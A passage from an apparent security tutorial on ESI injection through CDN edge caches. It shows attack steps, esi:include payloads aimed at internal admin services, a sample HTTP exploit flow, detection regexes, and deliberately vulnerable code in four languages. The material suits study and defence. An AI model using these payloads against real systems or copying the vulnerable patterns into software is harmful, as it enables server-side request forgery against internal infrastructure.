Discover the fatal validation gap: When an attacker injects an ESI tag (e.g., `<esi:include src="...">`), the backend sanitizer parses it as a benign, unknown custom XML element. Because it contains no JavaScript, the backend sanitizer approves the payload and saves it to the primary database
{% endstep %}

{% step %}
Understand the Proxy Execution vulnerability: The backend renders the HTML document containing the attacker's ESI tag and returns it to the Edge proxy. The Edge proxy, natively configured to parse and execute ESI tags, identifies the attacker's injected tag not as data, but as a highly privileged server-side execution directive
{% endstep %}

{% step %}
Formulate the ESI Injection payload. Identify a text field that is reflected on a publicly cached page (e.g., your public profile bio)
{% endstep %}

{% step %}
Construct an ESI payload designed to execute an internal Server-Side Request Forgery (SSRF) or exfiltrate sensitive HTTP request headers
{% endstep %}

{% step %}
Payload structure for Internal SSRF: `<esi:include src="[http://internal-admin-service.local/api/system/purge-cache](http://internal-admin-service.local/api/system/purge-cache)" />`
{% endstep %}

{% step %}
Submit the payload to the backend via standard application functionality
{% endstep %}

{% step %}
The backend HTML sanitizer evaluates `<esi:include>`. Finding no Javascript, it allows it
{% endstep %}

{% step %}
Navigate to the publicly cached page as a generic user (or trigger the CDN to cache the page)
{% endstep %}

{% step %}
The backend generates the HTML and returns it to Varnish/Fastly
{% endstep %}

{% step %}
The Edge Cache parses the HTML document. It detects the attacker's `<esi:include>` tag. Interpreting it as a legitimate structural command from the backend, the Edge node executes the outbound HTTP request to the internal microservice. The attacker achieves complete Server-Side Request Forgery, leveraging the Edge CDN's privileged network position purely via un-sanitized structural HTML injection

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(Response\.AddHeader\(\s*"Surrogate-Control"\s*,\s*"content=\\"ESI/1\.0\\"")|(\.Headers\.(?:Add|Append|Set)\(\s*"Surrogate-Control")|(\.Headers\.(?:Add|Append|Set)\(\s*"X-ESI")|(Surrogate-Control.*ESI/1\.0)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(response\.addHeader\(\s*"Surrogate-Control")|(response\.setHeader\(\s*"Surrogate-Control")|(response\.addHeader\(\s*"X-ESI")|(setHeader\(\s*"Surrogate-Control".*ESI/1\.0)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(header\(\s*['"]Surrogate-Control\s*:.*ESI/1\.0['"]\))|(header\(\s*['"]X-ESI\s*:)|(header\(\s*['"]Surrogate-Control)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(res\.(?:set|setHeader|append)\(\s*['"]Surrogate-Control['"])|(res\.(?:set|setHeader|append)\(\s*['"]X-ESI['"])|(Surrogate-Control['"]\s*,\s*['"]content="ESI/1\.0")
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Response\.AddHeader\("Surrogate-Control"|Headers\.(Add|Append|Set)\("Surrogate-Control"|Headers\.(Add|Append|Set)\("X-ESI"|Surrogate-Control.*ESI/1\.0
```
{% endtab %}

{% tab title="Java" %}
```regexp
response\.(addHeader|setHeader)\("Surrogate-Control"|response\.(addHeader|setHeader)\("X-ESI"|Surrogate-Control.*ESI/1\.0
```
{% endtab %}

{% tab title="PHP" %}
```regexp
header\(['"]Surrogate-Control:.*ESI/1\.0|header\(['"]X-ESI:|header\(['"]Surrogate-Control
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
res\.(set|setHeader|append)\(['"]Surrogate-Control['"]|res\.(set|setHeader|append)\(['"]X-ESI['"]|Surrogate-Control.*ESI/1\.0
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/profile/bio")]
public async Task<IActionResult> UpdateBio([FromBody] UpdateBioRequest request)
{
    // [1]
    // [2]
    var sanitizer = new HtmlSanitizer();
    // [3]
    // [4]
    // Sanitizer neutralizes scripts, but passes unrecognized XML nodes
    var safeBio = sanitizer.Sanitize(request.Bio);

    var user = await _dbContext.Users.FindAsync(User.GetUserId());
    user.Bio = safeBio;
    await _dbContext.SaveChangesAsync();

    return Ok();
}

[HttpGet("/profile/{id}")]
public async Task<IActionResult> GetProfile(string id)
{
    var user = await _dbContext.Users.FindAsync(id);
    
    Response.Headers.Add("Surrogate-Control", "content=\"ESI/1.0\"");
    
    return View("Profile", user);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class ProfileController {

    @PostMapping("/api/v1/profile/bio")
    public ResponseEntity<Void> updateBio(
            @RequestBody UpdateBioRequest request
    ) throws Exception {

        // [1]
        // [2]
        HtmlSanitizer sanitizer = new HtmlSanitizer();

        // [3]
        // [4]
        // Sanitizer neutralizes scripts, but passes unrecognized XML nodes
        String safeBio = sanitizer.sanitize(
                request.getBio()
        );

        User user = dbContext.users()
                .findById(SecurityUtils.getUserId());

        user.setBio(safeBio);

        dbContext.save(user);

        return ResponseEntity.ok().build();
    }


    @GetMapping("/profile/{id}")
    public String getProfile(
            @PathVariable String id,
            HttpServletResponse response,
            Model model
    ) throws Exception {

        User user = dbContext.users()
                .findById(id);


        response.addHeader(
                "Surrogate-Control",
                "content=\"ESI/1.0\""
        );


        model.addAttribute(
                "user",
                user
        );

        return "Profile";
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class ProfileController extends Controller
{
    public function updateBio(Request $request)
    {
        // [1]
        // [2]
        $config = \HTMLPurifier_Config::createDefault();
        
        // [3]
        // [4]
        // If the configuration allows undefined tags or ignores namespaces, 
        // the <esi:include> tag is persisted safely.
        $purifier = new \HTMLPurifier($config);
        $safeBio = $purifier->purify($request->input('bio'));

        $user = auth()->user();
        $user->bio = $safeBio;
        $user->save();

        return response()->json(['status' => 'Updated']);
    }

    public function showProfile($id)
    {
        $user = User::findOrFail($id);
        
        // Tells the CDN to process Edge Side Includes
        return response(view('profile', ['user' => $user]))
                ->header('Surrogate-Control', 'content="ESI/1.0"');
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const sanitizeHtml = require('sanitize-html');

router.post('/api/v1/profile/bio', async (req, res) => {
    // [1]
    // [2]
    // Backend standard HTML Sanitizer
    let safeBio = sanitizeHtml(req.body.bio, {
        allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br'],
        // [3]
        // [4]
        // The sanitizer is unaware of <esi:include>. Depending on the library version
        // or loose configuration allowing custom XML tags, the payload sails through.
    });

    await User.update({ bio: safeBio }, { where: { id: req.user.id } });
    res.send({ status: 'Updated' });
});

// Response Route
router.get('/profile/:id', async (req, res) => {
    let user = await User.findByPk(req.params.id);
    
    // Sets headers instructing Fastly/Varnish to parse the response for ESI tags
    res.setHeader('Surrogate-Control', 'content="ESI/1.0"');
    
    // The attacker's bio is embedded directly into the HTML
    res.send(`<html><body>${user.bio}</body></html>`);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] To handle extreme global traffic loads, the enterprise architects shifted dynamic page assembly from the application servers to the Edge CDN using Edge Side Includes (ESI), \[2] The backend application is instructed to emit raw ESI tags within its HTML responses and signal the CDN via HTTP headers (`Surrogate-Control`) to execute them, \[3] The backend relies exclusively on a standard HTML Sanitizer to clean user inputs (like profile bios or forum comments), stripping cross-site scripting vectors based on W3C DOM specifications, \[4] The fatal boundary desynchronization. The backend sanitizer and the Edge Proxy operate on entirely different syntactic planes. The backend views `<esi:include>` as harmless, inert data because it lacks JavaScript. However, when the backend transmits the HTML to the CDN, the Edge Proxy evaluates the exact same string as a highly privileged, server-side execution directive. The attacker exploits this semantic gap by injecting structural proxy commands into standard user input fields. The CDN blindly executes the injected tag, granting the attacker the ability to forge outbound network requests originating from the trusted edge infrastructure

```http
// 1. Attacker updates their public profile bio, injecting an ESI tag.
// The payload is designed to target an internal backend administrative microservice.

POST /api/v1/profile/bio HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "bio": "Security Researcher <esi:include src='http://internal-admin-mesh.local/api/v1/system/purge-cache?force=true' />"
}

// 2. The backend HTML Sanitizer parses the bio. Finding no <script> tags, it saves the payload to the DB.
// 3. The attacker navigates to their public profile page on the main domain.

GET /profile/attacker123 HTTP/1.1
Host: www.enterprise.tld

// 4. The request hits the Varnish/Fastly CDN Edge node.
// 5. The Edge Node queries the backend for the HTML.
// 6. The backend returns the HTML containing the attacker's bio and the Surrogate-Control header.

// 7. Varnish intercepts the response. It parses the HTML looking for <esi:include> tags.
// 8. Varnish finds the attacker's injected tag: <esi:include src='http://internal-admin-mesh.local...' />
// 9. Varnish pauses delivering the page, initiates an HTTP GET request to the internal microservice, 
//    and blindly stitches the internal service's response back into the attacker's bio.
// 10. The internal service executes the cache purge action without authentication because the request 
//     originated from the highly trusted CDN Edge IP.
```
{% endstep %}

{% step %}
To maximize cache hit ratios for highly dynamic content, infrastructure engineers decoupled page assembly, shifting the aggregation of HTML fragments to the CDN Edge utilizing Edge Side Includes (ESI). This optimization established a layered parsing architecture where the backend generated content and the CDN structurally manipulated it prior to delivery. The security failure originated from a namespace and context dissonance between the two tiers. Backend developers applied strict HTML sanitization to neutralize client-side threats (XSS) but completely ignored proxy-side execution directives, assuming XML namespaces were inert. The attacker weaponized this parsing differential by submitting valid ESI syntax within standard text fields. The backend sanitizer validated the payload as structurally safe and persisted it. During edge assembly, the CDN intercepted the HTML, identified the attacker's ESI tag, and treated it as an authoritative backend instruction. This structural injection successfully hijacked the Edge node's network privileges, transforming benign text reflection into a devastating, infrastructure-level Server-Side Request Forgery (SSRF)
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
